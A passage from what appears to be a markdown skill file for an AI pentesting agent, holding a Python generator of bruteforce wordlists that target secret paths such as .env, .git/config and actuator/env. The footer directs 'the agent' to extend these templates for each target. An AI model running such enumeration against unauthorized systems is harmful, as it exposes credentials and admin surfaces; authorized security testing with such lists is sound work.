    analysis["grade"] = "A" if analysis["score"] >= 40 else "B" if analysis["score"] >= 30 else "C" if analysis["score"] >= 20 else "D" if analysis["score"] >= 10 else "F"
    return analysis
```

---

## 8. DIRECTORY AND FILE BRUTEFORCE WORDLIST GENERATOR

```python
def generate_wordlist(target_type: str = "general") -> list[str]:
    """Generate context-aware wordlists for directory/file bruteforcing."""
    general = [
        "admin", "administrator", "login", "dashboard", "panel",
        "api", "v1", "v2", "v3", "graphql", "swagger", "docs",
        "wp-admin", "wp-login.php", "wp-content", "wp-includes",
        ".git", ".git/config", ".git/HEAD", ".gitignore",
        ".env", ".env.bak", ".env.local", ".env.production",
        "config", "configuration", "settings", "setup",
        "backup", "backups", "bak", "old", "temp", "tmp",
        "debug", "test", "testing", "staging", "dev",
        "phpinfo.php", "info.php", "server-status", "server-info",
        "robots.txt", "sitemap.xml", "crossdomain.xml",
        ".well-known", ".well-known/security.txt",
        "console", "shell", "cmd", "terminal",
        "upload", "uploads", "files", "media", "static",
        "database", "db", "sql", "dump", "export",
        "cgi-bin", "bin", "scripts", "includes",
        "internal", "private", "secret", "hidden",
        "status", "health", "healthcheck", "metrics", "monitor",
        "actuator", "actuator/env", "actuator/health",
        "trace", "elmah.axd", "error_log",
    ]

    api_specific = [
        "api/users", "api/admin", "api/config", "api/debug",
        "api/v1/users", "api/v1/admin", "api/v1/config",
        "api/v2/users", "api/v2/admin",
        "api/internal", "api/private", "api/hidden",
        "api/swagger.json", "api/openapi.json", "api/docs",
        "graphql", "graphql/console", "graphiql",
        "api/graphql", "api/graphql/schema",
    ]

    if target_type == "api":
        return general + api_specific
    return general
```

---

*This skill file provides the core technical arsenal. The agent should extend these templates based on the specific target and vulnerability class being tested. Always write production-quality code with proper error handling.*

